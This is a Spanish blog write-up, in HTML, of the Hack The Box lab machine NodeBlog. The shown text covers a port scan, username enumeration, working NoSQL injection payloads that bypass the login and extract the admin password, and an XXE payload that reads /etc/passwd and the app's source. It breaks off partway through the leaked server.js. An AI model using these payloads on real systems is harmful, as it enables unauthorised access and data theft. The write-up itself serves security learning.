<!doctype html><html lang=es>
<head>
<title>NodeBlog | 7Rocky</title>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/NodeBlog/NodeBlog.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="NodeBlog">
<meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/nodeblog/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2022-01-10T00:00:00+01:00">
<meta property="article:modified_time" content="2022-02-24T17:23:22+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/NodeBlog/NodeBlog.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="NodeBlog">
<meta itemprop=description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades"><meta itemprop=datePublished content="2022-01-10T00:00:00+01:00">
<meta itemprop=dateModified content="2022-02-24T17:23:22+01:00">
<meta itemprop=wordCount content="1368">
<meta itemprop=keywords content="cve,sudo,express,nosqli,xxe,insecure-deserialization,user-enumeration,password-reuse,rce,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="NodeBlog">
<meta name=twitter:description content="Hack The Box. Linux. Máquina fácil. Esta máquina contiene un blog que es vulnerable a inyección NoSQL, luego a inyección de Entidades Externas XML (XXE) y finalmente a deserialización insegura para obtener ejecución remota de comandos. Para comprometer esta máquina se necesitan técnicas avanzadas de explotación web y habilidades de programación. En este write-up se utilizan scripts en Bash, Python y Node.js para explotar todas las vulnerabilidades">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/NodeBlog/NodeBlog.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-Z1HQGH3M4D',{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div>
</head>
<body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/nodeblog/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li>
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li>
</ul>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</nav>
</div>
</header>
<main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside>
<div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/nodeblog/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/nodeblog/&text=NodeBlog" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/nodeblog/&title=NodeBlog" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div>
<h1 class="f1 mt3 mb1">NodeBlog</h1>
<time class="f6 mv4 dib tracked" datetime=2022-01-10T00:00:00+01:00>10 / 01 / 2022</time>
</header>
<div class=htb-image>
<img alt=NodeBlog src=/images/HTB/NodeBlog/NodeBlog.png>
</div>
<ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/sudo title=sudo>sudo</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/express title="Express JS">Express JS</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/nosqli title="Inyección NoSQL">Inyección NoSQL</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/xxe title="Entidad Externa XML">Entidad Externa XML</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/insecure-deserialization title="Deserialización Insegura">Deserialización Insegura</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/user-enumeration title="Enumeración de usuarios">Enumeración de usuarios</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/password-reuse title="Reutilización de contraseñas">Reutilización de contraseñas</a>
</li>
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/rce title="Ejecución remota de comandos">Ejecución remota de comandos</a>
</li>
</ul>
<aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#encontrando-una-inyección-nosql>Encontrando una inyección NoSQL</a></li>
<li><a href=#encontrando-una-inyección-xxe>Encontrando una inyección XXE</a></li>
<li><a href=#encontrando-una-deserialización-insegura>Encontrando una deserialización insegura</a></li>
<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
</ul>
</nav>
</div>
</aside>
<div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Linux
</li>
<li>
<strong>Dificultad</strong>: Fácil
</li>
<li>
<strong>Dirección IP</strong>: 10.10.11.139
</li>
<li>
<strong>Fecha</strong>: 10 / 01 / 2022
</li>
</ul>
<h2 id=escaneo-de-puertos>Escaneo de puertos</h2>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.139 -p 22,5000
Nmap scan report for 10.10.11.139
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done -- 1 IP address (1 host up) scanned in 15.37 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 5000 (HTTP).</p>
<h2 id=enumeración-web>Enumeración web</h2>
<p>Si vamos a <code>http://10.10.11.139:5000</code>, encontraremos un blog montado sobre Express.js (un <em>framework</em> web de Node.js):</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-index.png alt="NodeBlog index"></p>
<p>Aquí podemos tratar de iniciar sesión:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-login.png alt="NodeBlog login"></p>
<p>Lo primero que podemos probar son credenciales por defecto. Durante el proceso, vemos que el formulario es vulnerable a enumeración de usuarios:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'user=asdf&password=asdf'</span> | <span class=code-dark-green>grep</span> Invalid
            <span class=code-red>Invalid</span> Username

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'user=admin&password=asdf'</span> | <span class=code-dark-green>grep</span> Invalid  
            <span class=code-red>Invalid</span> Password
</code></pre></div>
<p>Y por tanto, sabemos que <code>admin</code> es un usuario válido. Entonces, podemos realizar un ataque de fuerza bruta para enumerar más usuarios válidos:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>ffuf</span> -w $WORDLISTS/names.txt -u http://10.10.11.139:5000/login -d <span class=code-dark-yellow>'user=FUZZ&password=x'</span> -mr <span class=code-dark-yellow>'Invalid Password'</span> -H <span class=code-dark-yellow>'Content-Type: application/x-www-form-urlencoded'</span>  
admin                   [Status: <span class=code-dark-green>200</span>, Size: 1040, Words: 151, Lines: 30]
</code></pre></div>
<p>Pero parece que no hay más usuarios comunes a parte de <code>admin</code>.</p>
<h2 id=encontrando-una-inyección-nosql>Encontrando una inyección NoSQL</h2>
<p>Después de tratar de inyectar código SQL y probar contraseñas comunes, uno puede pensar que el servidor está utilizando MongoDB (<em>stack</em> MEAN: MongoDB, Express.js, Angular, Node.js). Por tanto, podemos buscar <em>payloads</em> de inyección NoSQL.</p>
<p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings>PayloadsAllTheThings</a> tiene muchos <em>payloads</em>, algunos con <code>application/x-www-form-urlencoded</code> y otros utilizando <code>application/json</code>.</p>
<p>Podemos probar con <code>application/x-www-form-urlencoded</code> (como en los comandos anteriores con <code>curl</code>), pero ninguno funciona. Cambiemos entonces el tipo de contenido y verifiquemos que todo funciona bien:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid  
            <span class=code-red>Invalid</span> Password
</code></pre></div>
<p>Perfecto, ahora podemos añadir operadores de MongoDB:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$eq":"admin"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid  
            <span class=code-red>Invalid</span> Password

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$ne":"admin"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
            <span class=code-red>Invalid</span> Username

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":{"$ne":"asdf"},"password":"asdf"}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
            <span class=code-red>Invalid</span> Password
</code></pre></div>
<p>Utilizando el siguiente <em>payload</em>, podemos saltarnos el formulario de inicio de sesión y obtener una <em>cookie</em> de sesión válida:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -isd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":""}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span>
HTTP/1.1 200 OK
<span class=code-white>X-Powered-By</span>: Express
<span class=code-white>Set-Cookie</span>: auth=%7B%22user%22%3A%22admin%,%22sign%22%3A%2223e112072945418601deb47d9a6c7de8%22%7D; Max-Age=900; Path=/; HttpOnly  
<span class=code-white>Content-Type</span>: text/html; charset=utf-8
<span class=code-white>Content-Length</span>: 2589
<span class=code-white>ETag</span>: W/"a1d-JGrC4mhnlEApoTWWPEhYOlLd+UA"
<span class=code-white>Date</span>:
<span class=code-white>Connection</span>: keep-alive
<span class=code-white>Keep-Alive</span>: timeout=5

...
</code></pre></div>
<p>Además, podemos extraer la contraseña de <code>admin</code> utilizando el operador <code>$regex</code>. Para extraer la longitud de la contraseña, podemos incrementar el número hasta que coincida (no hay salida en el segundo comando ya que no hay mensaje de error):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":"^.{24}$"}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid  
            <span class=code-red>Invalid</span> Password

<span class=code-cyan>$</span> <span class=code-dark-green>curl</span> 10.10.11.139:5000/login -sd <span class=code-dark-yellow>'{"user":"admin","password":{"$regex":"^.{25}$"}}'</span> -H <span class=code-dark-yellow>'Content-Type: application/json'</span> | <span class=code-dark-green>grep</span> Invalid
</code></pre></div>
<p>Después, podemos añadir caracteres hasta que la expresión regular coincida y finalmente obtener la contraseña. Para automatizar el proceso, utilicé un <em>script</em> en Bash llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/nosqli.sh><code>nosqli.sh</code></a>. El <em>script</em> obtiene la longitud de la contraseña y luego la extrae (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#nosqlish>aquí</a>).</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>bash</span> nosqli.sh
Password length: 25
Password: IppsecSaysPleaseSubscribe  
</code></pre></div>
<h2 id=encontrando-una-inyección-xxe>Encontrando una inyección XXE</h2>
<p>Utilizando la contraseña obtenida, podemos iniciar sesión correctamente:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-admin.png alt="NodeBlog admin panel"></p>
<p>Aquí, podemos crear un nuevo artículo. No obstante, al tratar de guardarlo, tenemos un error:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-error.png alt="NodeBlog error"></p>
<p>Esto será interesante más adelante, porque conocemos ya la ruta absoluta donde está el código de la aplicación web (<code>/opt/blog</code>).</p>
<p>Existe otra funcionalidad que es subir un artículo. Podemos añadir un archivo cualquiera y obtener un error de XML:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-xml.png alt="NodeBlog XML error"></p>
<p>Entonces, necesitamos subir un documento XML válido, como este:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;</span>  
  <span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
</code></pre></div>
<p>Y vemos que el servidor lo analiza y rellena los campos del formulario para editar el artículo:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-edit.png alt="NodeBlog edit"></p>
<p>En este punto, podemos efectuar una inyección de Entidad Externa XML (XXE), esto es, añadir una entidad que tome el contenido de un archivo y lo ponga en un elemento del documento XML. Un simple <em>payload</em> XXE sería el siguiente:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk1>&lt;?</span><span class=mtk5>xml</span> <span class=mtk8>version</span><span class=mtk1>=</span><span class=mtk4>"1.0"</span><span class=mtk1>?&gt;</span>
<span class=mtk1>&lt;!</span><span class=mtk5>DOCTYPE</span> <span class=mtk9>foo</span> <span class=mtk1>[ &lt;!</span><span class=mtk5>ENTITY</span> <span class=mtk9>xxe</span> <span class=mtk5>SYSTEM</span> <span class=mtk4>"</span><span class="mtk4 detected-link">file:///etc/passwd</span><span class=mtk4>"</span><span class=mtk1>&gt; ]&gt;</span>  
<span class=mtk1>&lt;</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>title</span><span class=mtk1>&gt;ASDF&lt;/</span><span class=mtk5>title</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>description</span><span class=mtk1>&gt;</span><span class=mtk6>&amp;xxe;</span><span class=mtk1>&lt;/</span><span class=mtk5>description</span><span class=mtk1>&gt;</span>
  <span class=mtk1>&lt;</span><span class=mtk5>markdown</span><span class=mtk1>&gt;&lt;/</span><span class=mtk5>markdown</span><span class=mtk1>&gt;</span>
<span class=mtk1>&lt;/</span><span class=mtk5>post</span><span class=mtk1>&gt;</span>
</code></pre></div>
<p>Si subimos este documento, obtenemos el archivo <code>/etc/passwd</code> en el campo de descripción:</p>
<p><img src=/images/HTB/NodeBlog/NodeBlog-xxe.png alt="NodeBlog XXE"></p>
<p>Con esta vulnerabilidad, podemos leer archivos del servidor si conocemos la ruta absoluta. Para explotarla, utilicé un <em>script</em> en Python llamado <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/xxe.py><code>xxe.py</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#xxepy>aquí</a>).</p>
<p>Tenemos la ruta base del servidor (<code>/opt/blog</code>), mostrada en un mensaje de error. El archivo principal de una aplicación de Node.js suele ser: <code>app.js</code>, <code>main.js</code>, <code>script.js</code>, <code>index.js</code> o <code>server.js</code>. Podemos probar estos archivos y ver que <code>server.js</code> existe:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>pyhton3</span> xxe.py /opt/blog/server.js  
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">const</span> <span class=mtk8>express</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'express'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>mongoose</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'mongoose'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>Article</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'./models/article'</span><span class=mtk1>)</span>
